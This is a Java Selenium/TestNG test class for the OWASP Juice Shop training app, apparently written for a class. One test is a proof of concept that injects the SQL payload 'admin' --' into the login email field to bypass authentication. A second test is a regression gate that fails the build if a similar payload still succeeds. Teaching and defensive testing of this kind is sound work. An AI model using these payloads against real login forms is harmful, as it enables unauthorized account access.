import org.automation.DriverManager;
import org.automation.BrowserType;
import org.utilities.JuiceShopEnvironment;

import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.testng.Assert;
import org.testng.annotations.*;

import java.time.Duration;

public class JuiceShopTest {

    @BeforeSuite
    public void startServer() {
        JuiceShopEnvironment.startEnvironment();
    }

    @BeforeMethod
    public void setupAndClearBanners() {
        DriverManager.initDriver(BrowserType.CHROME);
        var driver = DriverManager.getDriver();
        driver.get(JuiceShopEnvironment.getBaseUrl());

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));

        // Clear Welcome Banner
        By welcomeBannerBtn = By.cssSelector("button[aria-label='Close Welcome Banner']");
        wait.until(ExpectedConditions.elementToBeClickable(welcomeBannerBtn)).click();

        // Clear Cookie Banner
        try {
            By cookieConsentBtn = By.cssSelector("a[aria-label='dismiss cookie message']");
            wait.until(ExpectedConditions.elementToBeClickable(cookieConsentBtn)).click();
        } catch (Exception e) {
            System.out.println("Cookie banner not found.");
        }
    }

    // Priority 1: The Attacker PoC (Passes when the exploit works)
    @Test(priority = 1)
    public void testSqliLoginBypassPoC() throws InterruptedException {
        var driver = DriverManager.getDriver();
        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5));

        // 1. Navigate to the login page
        driver.get(JuiceShopEnvironment.getBaseUrl() + "/#/login");

        // 2. Inject the SQLite payload into the email field
        WebElement emailField = wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("email")));
        emailField.sendKeys("admin' --");

        // 3. Type any random text into the password field
        driver.findElement(By.id("password")).sendKeys("does_not_matter");

        // 4. Click Login
        driver.findElement(By.id("loginButton")).click();

        // 5. Verify exploit success by looking for the user account button that only appears when logged in
        try {
            WebElement accountButton = wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("navbarAccount")));
            Assert.assertTrue(accountButton.isDisplayed(), "Failed to bypass login.");
            System.out.println("PoC Test Passed: SQLi Login Bypass confirmed.");

            // Pause so the class can see you are logged in as admin without a password
            Thread.sleep(3000);
        } catch (org.openqa.selenium.TimeoutException e) {
            Assert.fail("The login bypass failed to execute.");
        }
    }

    // Priority 2: The Defensive QA Gate (Fails the build if the app is vulnerable)
    @Test(priority = 2)
    public void testDefensiveLoginRegression() throws InterruptedException {
        var driver = DriverManager.getDriver();
        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5));

        driver.get(JuiceShopEnvironment.getBaseUrl() + "/#/login");

        WebElement emailField = wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("email")));
        emailField.sendKeys("admin@juice-sh.op' --");
        driver.findElement(By.id("password")).sendKeys("does_not_matter");
        driver.findElement(By.id("loginButton")).click();

        try {
            // If the account button appears, the app is vulnerable, so we fail the test.
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("navbarAccount")));

            // Pause to see the failure state
            Thread.sleep(3000);

            Assert.fail("VULNERABILITY DETECTED: The SQLi payload bypassed authentication.");

        } catch (org.openqa.selenium.TimeoutException e) {
            // If it times out looking for the account button, the login failed, meaning the app is secure.
            System.out.println("Regression Test Passed: The application rejected the SQLi payload.");
        }
    }

    @AfterMethod
    public void teardown() {
        DriverManager.quitDriver();
    }

    @AfterSuite
    public void stopServer() {
        JuiceShopEnvironment.stopEnvironment();
    }
}